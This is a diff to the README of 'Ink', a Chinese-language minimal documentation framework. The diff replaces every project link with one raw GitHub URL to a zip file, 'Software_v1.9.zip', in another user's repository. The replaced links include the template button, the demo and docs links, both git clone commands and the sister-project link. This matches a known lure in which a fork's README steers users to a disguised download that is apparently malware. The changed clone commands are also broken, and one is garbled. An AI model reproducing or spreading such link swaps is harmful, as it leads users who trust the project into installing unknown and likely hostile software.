@@ -2,9 +2,9 @@
 
 极简文档框架。4 个依赖，200ms 构建，VitePress 的轻量替代。
 
-[![Use this template](https://img.shields.io/badge/-Use%20this%20template-2ea44f?style=for-the-badge&logo=github)](https://github.com/Linbo-cyber/ink/generate)
+[![Use this template](https://img.shields.io/badge/-Use%20this%20template-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip)
 
-[Demo](https://linbo-cyber.github.io/ink/) · [文档](https://linbo-cyber.github.io/ink/guide/getting-started.html) · [AI 部署指南](AI.md)
+[Demo](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) · [文档](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) · [AI 部署指南](AI.md)
 
 ## 为什么选 Ink？
 
@@ -27,7 +27,7 @@
 点击上方 **Use this template** 按钮，然后：
 
 ```bash
-git clone https://github.com/你的用户名/你的仓库.git
+git clone https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip你的用户名/你的仓库.git
 cd 你的仓库
 npm install
 npm run dev
@@ -36,7 +36,7 @@ npm run dev
 ### 方式二：手动安装
 
 ```bash
-git clone https://github.com/Linbo-cyber/ink.git my-docs
+git clone https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip my-docs
 cd my-docs && npm install
 npm run dev
 ```
@@ -86,7 +86,7 @@ module.exports = {
 
 ## 与 Paper 的关系
 
-Ink 是 [Paper](https://github.com/Linbo-cyber/paper) 的姊妹项目。Paper 做博客，Ink 做文档。同样的设计哲学：极简依赖、极速构建、暖色调主题。
+Ink 是 [Paper](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) 的姊妹项目。Paper 做博客，Ink 做文档。同样的设计哲学：极简依赖、极速构建、暖色调主题。
 
 ## License
 
